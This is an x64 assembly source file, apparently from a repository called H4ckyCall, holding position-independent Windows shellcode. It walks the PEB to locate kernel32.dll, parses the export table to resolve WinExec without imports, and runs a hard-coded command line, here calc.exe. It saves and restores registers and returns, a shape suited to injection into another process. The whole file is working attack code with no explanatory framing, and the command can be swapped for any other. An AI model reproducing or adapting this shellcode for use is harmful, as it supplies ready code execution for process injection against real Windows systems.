; @author Groszek(k)
; @repository https://github.com/Groszekk/H4ckyCall

[bits 64]
section .text

global _start

  _start:
    push rax
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    push rbp

	push rbp
	mov rbp, rsp
	sub rsp, 32

	mov rax, 0x636578456E6957 ; 'WinExec'
	push rax
	xor rax, rax
	mov [rbp-8], rsp

    mov rbx, [gs:0x60]      ; PEB
	mov rbx, [rbx + 0x18]   ; PEB_LDR_DATA
	mov rbx, [rbx + 0x20]   ; InMemoryOrderModuleList
	mov rbx, [rbx]	
	mov rbx, [rbx]	
	mov rbx, [rbx + 0x20]	; rbx holds kernel32.dll base address

	mov eax, [rbx + 0x3C]
	add rax, rbx
	mov eax, [rax + 0x88]
	add rax, rbx

	mov ecx, [rax + 0x24]
	add rcx, rbx
	mov [rbp-16], rcx 		    ; var16 = Address of Ordinal Table

	mov edi, [rax + 0x20]
	add rdi, rbx
	mov [rbp-24], rdi 		    ; var24 = Address of Name Pointer Table

	mov edx, [rax + 0x1C]
	add rdx, rbx
	mov [rbp-32], rdx 		    ; var32 = Address of Address Table

	mov edx, [rax + 0x14] 		; Number of exported functions

	xor eax, eax 				; counter

	loop:
	        mov rdi, [rbp-24]
			mov rsi, [rbp-8]
	        xor rcx, rcx

	        cld
	        mov edi, [rdi + rax * 4]
	        add rdi, rbx
	        add rcx, 8
	        repe cmpsb
	        jz found

	        inc eax
	        cmp rax, rdx
	        jb loop

	        add rsp, 0x26    		
	        jmp end

	found:
	        mov rcx, [rbp-16]
	        mov rdx, [rbp-32]

	        mov ax, [rcx + rax * 2]
	        mov eax, [rdx + rax * 4]
	        add rax, rbx

	    xor rdx, rdx

		mov edx, 0xa	; SW_SHOWDEFAULT
		mov rcx, CmdLine
		call rax

		add rsp, 0x46

	end:
		pop rbp
		pop rdi
		pop rsi
		pop rdx
		pop rcx
		pop rbx
		pop rax
		ret


section .data
CmdLine db 'C:\Windows\System32\calc.exe', 0